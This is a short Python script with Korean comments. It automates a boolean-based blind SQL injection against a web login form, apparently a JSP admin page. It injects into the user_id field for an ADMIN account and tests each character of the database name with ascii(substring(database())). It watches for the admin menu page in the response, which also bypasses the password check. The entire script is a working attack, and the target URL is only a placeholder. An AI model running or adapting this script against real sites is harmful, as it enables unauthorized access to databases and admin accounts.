import requests
URL = "https://URL입력"

min = 97 # 'a'
max = 122 # 'z'
DB_LENGTH = 5
dbname = []

for idx in range(1, DB_LENGTH+1): #DB이름 만큼 반복
   for cnt in range(min, max+1): #알파벳 전부 테스트
      sqlquery = "ADMIN" + "'+and+ascii(substring(database()," + str(idx) + ",1))=" + str(cnt) + "#" #ADMIN은 계정명
      postquery = "user_id=" + sqlquery + "&passwd=PASSWORD" #PASSWORD는 패스워드
      res = requests.post(url=URL, data=postquery, headers={'Content-Type': 'application/x-www-form-urlencoded'})
      #print(res.status_code)
      if "/admin/main/menu.jsp" in res.text: #원하는 응답값 입력
         print(f"확인 {cnt}")
         dbname.append(chr(cnt))
         break
print(f"DB 이름은 {dbname} 입니다")
